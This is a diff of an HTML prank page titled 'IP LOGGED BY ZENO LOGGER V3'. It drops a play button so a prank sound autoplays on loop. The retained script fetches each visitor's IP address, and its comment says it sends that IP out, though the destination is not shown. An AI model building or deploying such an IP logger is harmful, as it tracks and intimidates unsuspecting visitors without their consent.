@@ -26,18 +26,6 @@
             max-width: 300px;
             margin: 20px 0;
         }
-        button {
-            padding: 10px 20px;
-            font-size: 18px;
-            background-color: red;
-            color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-        button:hover {
-            background-color: darkred;
-        }
         .background {
             position: absolute;
             top: 0;
@@ -64,20 +52,12 @@
 <div class="content">
     <h1>IP LOGGED BY ZENO LOGGER V3</h1>
     <img src="logo.png" alt="Prank Logo">
-    <button id="playSound">Play Sound</button>
     <div id="ipResult"></div>
 </div>
 
-<audio id="prankSound" src="sound.mp3"></audio>
+<audio id="prankSound" src="sound.mp3" autoplay loop></audio>
 
 <script>
-    // Play sound on button click
-    const playButton = document.getElementById('playSound');
-    const prankSound = document.getElementById('prankSound');
-    playButton.addEventListener('click', () => {
-        prankSound.play();
-    });
-
     // Fetch and send IP data
     function getMyIpAddress() {
         fetch("https://api64.ipify.org?format=json")
